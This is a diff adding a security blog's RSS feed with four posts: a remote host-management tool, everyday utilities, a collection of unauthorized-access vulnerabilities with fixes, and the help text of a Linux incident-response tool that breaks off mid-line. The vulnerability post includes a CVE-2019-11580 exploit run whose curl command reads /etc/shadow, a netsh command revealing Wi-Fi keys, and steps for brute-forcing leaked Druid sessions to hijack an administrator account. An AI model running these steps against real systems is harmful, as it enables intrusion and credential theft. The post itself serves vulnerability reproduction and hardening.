@@ -1,0 +1,694 @@
+<?xml version="1.0"?>
+<rss version="2.0">
+    <channel>
+        <title>余香</title>
+        <link>http://example.com</link>
+        <description></description>
+        <language>zh-CN</language>
+        <pubDate>Tue, 12 Nov 2024 10:19:30 +0800</pubDate>
+        <lastBuildDate>Tue, 12 Nov 2024 10:19:30 +0800</lastBuildDate>
+        <category>漏洞复现</category>
+        <category>神兵利器</category>
+        <category>应急响应</category>
+        <category>日常小工具</category>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/12/natpass/</guid>
+            <title>natpass 主机管理工具</title>
+            <link>http://example.com/2024/11/12/natpass/</link>
+            <category>神兵利器</category>
+            <pubDate>Tue, 12 Nov 2024 10:19:30 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;主机管理工具-natpass&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主机管理工具-natpass&#34;&gt;#&lt;/a&gt; 主机管理工具 - Natpass&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;如果你有多台电脑该如何统一管理呢？natpass可以轻松解决以上问题。它是一款新一代主机管理工具，支持shell管理，支持远程桌面管理，支持多种操作系统和web平台。当然，也可以利用此工具进行渗透测试。
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;部署&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#部署&#34;&gt;#&lt;/a&gt; 部署&lt;/h2&gt;
+&lt;p&gt;部署过程共分为三部分：服务器端、受控端和控制端三部分组成。当然，服务端和控制端可以为同一台设备。首先，我们到中根据系统下载包。&lt;br&gt;
+项目地址：&lt;a href=&#34;https://github.com/lwch/natpass/releases&#34;&gt;https://github.com/lwch/natpass/releases&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;解压&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tar -zxvf natpass_0.13.0_linux_amd64.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;部署服务端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#部署服务端&#34;&gt;#&lt;/a&gt; 部署服务端&lt;/h2&gt;
+&lt;p&gt;进入软件目录，执行下面命令。&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./np-svr --conf server.yaml&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112101939.png&#34; alt=&#34;20241112101939&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;部署控制端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#部署控制端&#34;&gt;#&lt;/a&gt; 部署控制端&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;./np-cli --conf local.yaml
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;具体的配置在 local.yaml 文件中，如端口等。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104251.png&#34; alt=&#34;20241112104251&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#访问&#34;&gt;#&lt;/a&gt; 访问&lt;/h2&gt;
+&lt;p&gt;在以上操作成功后即可在浏览器中通过 local.yaml 中配置的端口号进行访问，默认地址：&lt;a href=&#34;http://127.0.0.1:8080&#34;&gt;http://127.0.0.1:8080&lt;/a&gt;&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104329.png&#34; alt=&#34;20241112104329&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;受控端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#受控端&#34;&gt;#&lt;/a&gt; 受控端&lt;/h2&gt;
+&lt;p&gt;受控端，我以 Windows11 为例。首先现在 Windows 平台的安装包。修改 remote.yaml 中的 server 地址。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104426.png&#34; alt=&#34;20241112104426&#34;&gt;&lt;br&gt;
+ 使用以下命令启动客户端程序&lt;br&gt;
+ np-cli.exe --conf remote.yaml&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104503.png&#34; alt=&#34;20241112104503&#34;&gt;&lt;br&gt;
+ 至此，所有配置均已完成。&lt;/p&gt;
+&lt;h2 id=&#34;使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用&#34;&gt;#&lt;/a&gt; 使用&lt;/h2&gt;
+&lt;p&gt;点击 shell 连接&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104541.png&#34; alt=&#34;20241112104541&#34;&gt;&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104650.png&#34; alt=&#34;20241112104650&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;vnc连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#vnc连接&#34;&gt;#&lt;/a&gt; Vnc 连接&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241112104738.png&#34; alt=&#34;20241112104738&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;总结&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h2&gt;
+&lt;p&gt;利用 natpass 我们能很便捷的完成不同平台多台电脑直接的统一管理。使用很便捷，小伙伴们有需要的，可以收藏哦！但部分功能尚未完善，如文件管理。期待作者的更新！&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/11/%E6%97%A5%E5%B8%B8%E5%B0%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/</guid>
+            <title>日常小工具集合</title>
+            <link>http://example.com/2024/11/11/%E6%97%A5%E5%B8%B8%E5%B0%8F%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/</link>
+            <category>日常小工具</category>
+            <pubDate>Mon, 11 Nov 2024 09:13:24 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;日常小工具集合&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日常小工具集合&#34;&gt;#&lt;/a&gt; 日常小工具集合&lt;/h1&gt;
+&lt;h2 id=&#34;查询真实ip&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查询真实ip&#34;&gt;#&lt;/a&gt; 查询真实 ip：&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://search.censys.io/search?resource=hosts&#34;&gt;https://search.censys.io/search?resource=hosts&lt;/a&gt;&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111091858.png&#34; alt=&#34;20241111091858&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;ip提取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ip提取&#34;&gt;#&lt;/a&gt; IP 提取：&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://potato.gold/navbar/tool/&#34;&gt;https://potato.gold/navbar/tool/&lt;/a&gt;&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111092147.png&#34; alt=&#34;20241111092147&#34;&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;查看wifi密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#查看wifi密码&#34;&gt;#&lt;/a&gt; 查看 wifi 密码&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;netsh wlan show profiles
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241205152751.png&#34; alt=&#34;20241205152751&#34;&gt;&lt;br&gt;
+name = 输入 wifi 名称&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;netsh wlan show profiles name=FL-5G-1393 key=clear&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241205152913.png&#34; alt=&#34;20241205152913&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/11/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</guid>
+            <title>未授权访问漏洞合集</title>
+            <link>http://example.com/2024/11/11/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</link>
+            <category>漏洞复现</category>
+            <pubDate>Mon, 11 Nov 2024 09:00:02 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;未授权访问漏洞合集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#未授权访问漏洞合集&#34;&gt;#&lt;/a&gt; 未授权访问漏洞合集&lt;/h1&gt;
+&lt;h2 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;未授权访问漏洞是一个在企业内部非常常见的问题，这种问题通常都是由于安全配置不当、认证页面存在缺陷，或者压根就没有认证导致的。当某企业对外的服务端口、功能无限制开放，并且对用户的访问没有做任何限制的时候，可能会泄露出某些用户信息、敏感信息甚至可以执行系统命令，操作系统文件，导致系统的整体安全遭到破坏。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111090506.png&#34; alt=&#34;20241111090506&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;active-mq-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#active-mq-未授权访问&#34;&gt;#&lt;/a&gt; Active MQ 未授权访问&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞简介&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞简介&#34;&gt;#&lt;/a&gt; 漏洞简介&lt;/h3&gt;
+&lt;p&gt;ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞检测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞检测&#34;&gt;#&lt;/a&gt; 漏洞检测&lt;/h3&gt;
+&lt;p&gt;默认端口：8161&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111232210.png&#34; alt=&#34;20241111232210&#34;&gt;&lt;br&gt;
+ 默认密码：admin/admin&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111232231.png&#34; alt=&#34;20241111232231&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞修复&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
+&lt;p&gt;● 针对未授权访问，可修改 conf/jetty.xml 文件，bean id 为 securityConstraint 下的 authenticate 修改值为 true，重启服务即可。&lt;br&gt;
+● 针对弱口令，可修改 conf/jetty.xml 文件，bean id 为 securityLoginService 下的 conf 值获取用户 properties，修改用户名密码，重启服务即可。&lt;br&gt;
+● 参考文章 &lt;a href=&#34;https://www.ouyangxiaoze.com/2020/08/631.html&#34;&gt;https://www.ouyangxiaoze.com/2020/08/631.html&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;atlassian-crowd-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#atlassian-crowd-未授权访问&#34;&gt;#&lt;/a&gt; Atlassian Crowd 未授权访问&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞简介-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞简介-2&#34;&gt;#&lt;/a&gt; 漏洞简介&lt;/h3&gt;
+&lt;p&gt;Atlassian Crowd 是一套基于 Web 的单点登录系统。该系统为多用户、网络应用程序和目录服务器提供验证、授权等功能。Atlassian Crowd Data Center 是 Crowd 的集群部署版。&lt;br&gt;
+Atlassian Crowd 和 Crowd Data Center 在其某些发行版本中错误地启用了 pdkinstall 开发插件，使其存在安全漏洞。攻击者利用该漏洞可在未授权访问的情况下对 Atlassian Crowd 和 Crowd Data Center 安装任意的恶意插件，执行任意代码 / 命令，从而获得服务器权限。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞检测-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞检测-2&#34;&gt;#&lt;/a&gt; 漏洞检测&lt;/h3&gt;
+&lt;p&gt;漏洞利用脚本 github 地址：&lt;a href=&#34;https://github.com/jas502n/CVE-2019-11580&#34;&gt;https://github.com/jas502n/CVE-2019-11580&lt;/a&gt;&lt;br&gt;
+1 git clone &lt;a href=&#34;https://github.com/jas502n/CVE-2019-11580&#34;&gt;https://github.com/jas502n/CVE-2019-11580&lt;/a&gt;&lt;br&gt;
+2 cd CVE-2019-11580/&lt;br&gt;
+3 python &lt;a href=&#34;http://CVE-2019-11580.py&#34;&gt;CVE-2019-11580.py&lt;/a&gt; &lt;a href=&#34;http://192.168.18.138:8095&#34;&gt;http://192.168.18.138:8095&lt;/a&gt;&lt;br&gt;
+4 curl &lt;a href=&#34;http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow&#34;&gt;http://192.168.18.138:8095/crowd/plugins/servlet/exp?cmd=cat /etc/shadow&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞修复-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复-2&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
+&lt;p&gt;● 设置访问 /crowd/admin/uploadplugin.action 的源 ip。&lt;br&gt;
+● 升级最新版本 (3.5.0 以上)。&lt;/p&gt;
+&lt;h2 id=&#34;couchdb-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#couchdb-未授权访问&#34;&gt;#&lt;/a&gt; CouchDB 未授权访问&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞介绍&#34;&gt;#&lt;/a&gt; 漏洞介绍&lt;/h3&gt;
+&lt;p&gt;Apache CouchDB 是一个开源数据库，默认会在 5984 端口开放 Restful 的 API 接口，如果使用 SSL 的话就会监听在 6984 端口，用于数据库的管理功能。其 HTTP Server 默认开启时没有进行验证，而且绑定在 0.0.0.0，所有用户均可通过 API 访问导致未授权访问。&lt;br&gt;
+在官方配置文档中对 HTTP Server 的配置有 WWW-Authenticate：Set this option to trigger basic-auth popup on unauthorized requests，但是很多用户都没有这么配置，导致漏洞产生。&lt;br&gt;
+Apache CouchDB 是⼀个开源数据库，专注于易⽤性和成为 &amp;quot;完全拥抱 web 的数据库&amp;quot; 。它是⼀个使⽤ JSON 作为存储格式，JavaScript 作为查询语⾔，MapReduce 和 HTTP 作为 API 的 NoSQL 数据库。应⽤⼴泛，如 BBC ⽤在其动态内容展示平台，Credit Suisse ⽤在其内部的商品部⻔的市场框架，Meebo，⽤在其社交平台（web 和应⽤程序）。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;p&gt;(port=“5984”) &amp;amp;&amp;amp; (is_honeypot=false &amp;amp;&amp;amp; is_fraud=false)&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233308.png&#34; alt=&#34;20241111233308&#34;&gt;&lt;br&gt;
+cd /vulhub/couchdb/CVE-2017-12636&lt;br&gt;
+docker-compose up -d&lt;br&gt;
+ 然后利用 curl 执⾏未授权访问测试命令：curl IP:5984/_config&lt;br&gt;
+ 如果目标存在 couchdb 未授权访问漏洞，则会出现如下&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233330.png&#34; alt=&#34;20241111233330&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;漏洞修复-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复-3&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
+&lt;p&gt;1. 指定 CouchDB 绑定的 IP （需要重启 CouchDB 才能⽣效）在 /etc/couchdb/local.ini ⽂件中&lt;br&gt;
+找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。 注：修改后只有本机才能访问 CouchDB。&lt;br&gt;
+2. 设置访问密码（需要重启 CouchDB 才能⽣效）在 /etc/couchdb/local.ini 中找到 “[admins]” 字段配置密码。&lt;br&gt;
+3. 设置 WWW-Authenticate，强制认证。&lt;/p&gt;
+&lt;h2 id=&#34;druid-未授权访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#druid-未授权访问&#34;&gt;#&lt;/a&gt; Druid 未授权访问&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞介绍-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞介绍-2&#34;&gt;#&lt;/a&gt; 漏洞介绍&lt;/h3&gt;
+&lt;p&gt;当开发者配置不当时就可能造成未授权访问&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-2&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;p&gt;在 fofa 中利用如下语句进行搜索&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;title=&amp;quot;Druid Stat Index&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;访问之后直接进入网站页面，则存在 druid 未授权访问漏洞&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233616.png&#34; alt=&#34;20241111233616&#34;&gt;&lt;br&gt;
+&lt;a href=&#34;http://43.130.0.0:8088/druid/weburi.html&#34;&gt;http://43.130.0.0:8088/druid/weburi.html&lt;/a&gt;&lt;br&gt;
+ 泄露了网站后台功能模块的 url 地址，大多数都是一些 api 接口，有时候也会泄露一些敏感文件&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233802.png&#34; alt=&#34;20241111233802&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;druid泄露点利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#druid泄露点利用&#34;&gt;#&lt;/a&gt; Druid 泄露点利用&lt;/h3&gt;
+&lt;p&gt;如果是单纯的提交一个未授权访问，可能 SRC 平台也就给个低危，几十块钱，但是如果我们利用泄露的 session 进行 url 爆破，可能就能从低危转向高危，具体操作步骤如下&lt;br&gt;
+ 1. 将所有的 session 组成字典，我这是是直接 copy 下来用 sublime 正则去提取的，随便找了一个普通的接口去爆破，如果 session 没失效的话会提示 200，如果 session 失效会提示 302 跳转登陆页。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/20241111233923.png&#34; alt=&#34;20241111233923&#34;&gt;&lt;br&gt;
+ 我这里是爆破出来了将近 100 个没有失效的 session，构造请求包也很简单，就抓一个登录的包，把 url 跟 cookie 里面的 session 替换一下就可以。&lt;br&gt;
+利用火狐里面的 cookie 替换工具，将 cookie 替换成我们爆破成功的 cookie，即可登录页面查看，&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/1fa5046754d70eac017c036b47ae34ff.png&#34; alt=&#34;1fa5046754d70eac017c036b47ae34ff&#34;&gt;&lt;br&gt;
+ 利用没失效的 session 成功访问后台界面&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/c963356503bae1319cdb3062dee23c98.png&#34; alt=&#34;c963356503bae1319cdb3062dee23c98&#34;&gt;&lt;br&gt;
+ 这里我碰到了一个小问题，就是访问单页面没有联动，每一个都是静态的页面，只能查看当前页面的东西，对于提交漏洞报告的时候，不是很能表明出漏洞的危害程度。2. 这里我们继续爆破，将泄露的 druid/weburi.html 组成字典，进行爆破。&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/383f9fe80df1acf3db70e8fc9964cf5a.png&#34; alt=&#34;383f9fe80df1acf3db70e8fc9964cf5a&#34;&gt;&lt;br&gt;
+ 在爆破 url 的时候，发现好几处管理员的页面，提示用户权限不足，看了一下是用户管理，这里我们就可以再对当前页面继续进行 session 爆破，我这里运气比较好，成功爆破到了管理员的 session，一般情况来说生产环境的应用系统，管理员一般都是会登录的。&lt;br&gt;
+利用管理员的 session 成功登录到了人员管理界面&lt;br&gt;
+&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/cb346346692012a13c10a9c66b30791e.png&#34; alt=&#34;cb346346692012a13c10a9c66b30791e&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://example.com/2024/11/10/whohk/</guid>
+            <title>whohk 应急响应工具</title>
+            <link>http://example.com/2024/11/10/whohk/</link>
+            <category>应急响应</category>
+            <pubDate>Sun, 10 Nov 2024 23:31:21 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;whohk&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#whohk&#34;&gt;#&lt;/a&gt; whohk&lt;/h1&gt;
+&lt;h2 id=&#34;介绍&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#介绍&#34;&gt;#&lt;/a&gt; 介绍&lt;/h2&gt;
+&lt;p&gt;whohk，linux 下一款强大的应急响应工具&lt;br&gt;
+在 linux 下的应急响应往往需要通过繁琐的命令行来查看各个点的情况，有的时候还需要做一些格式处理，这对于 linux 下命令不是很熟悉的人比较不友好。本工具将 linux 下应急响应中常用的一些操作给集合了起来，并处理成了较为友好的格式，只需要通过一个参数就能代替繁琐复杂的命令来实现对各个点的检查。&lt;br&gt;
+支持主流的 Linux，包含 centos、redhat、ubuntu、debian、opensuse。&lt;/p&gt;
+&lt;h2 id=&#34;使用指南&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用指南&#34;&gt;#&lt;/a&gt; 使用指南&lt;/h2&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;optional arguments:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -h, --help            show this help message and exit&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -user                 用于查看系统可登录账户和空口令账户（无参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -history              用于查看所有用户的敏感历史命令（无参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -cron                 用于查看所有用户的定时任务（无参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  -ip                   用于查看外连ip（无参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --pid 1234            用于定位进程物理路径（参数为pid号）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --ssh-fip             用于查看ssh登录失败的ip和次数（无参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --ssh-fuser           用于查看ssh登录失败的用户和次数（无参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --ssh-sip             用于查看ssh登录成功的ip和次数（无参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --ssh-sinfo           用于查看ssh登录成功的用户详情（无参数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --file-cron 7         用于查看系统各个级别定时任务目录中，n天内被修改的文件（参数为天数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --file-starup 7       用于查看系统启动项目录中，n天内被修改的文件（参数为天数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --file-os 7           用于查看系统重要目录中，n天内被修改的文件（参数为天数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --file-change /www 7 php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        用于查看在n天内指定目录中指定后缀的被修改的文件（参数为物理路径、天数、后缀）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --file-perm /www jsp 777&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        用于查看指定目录下指定后缀指定权限的文件（参数为物理路径、后缀、天数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --s-backdoor /home    用于检测指定路径下的恶意样本（参数为物理路径）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  --s-webshell /var/www&lt;/span&gt;&lt;br&gt;&lt;span 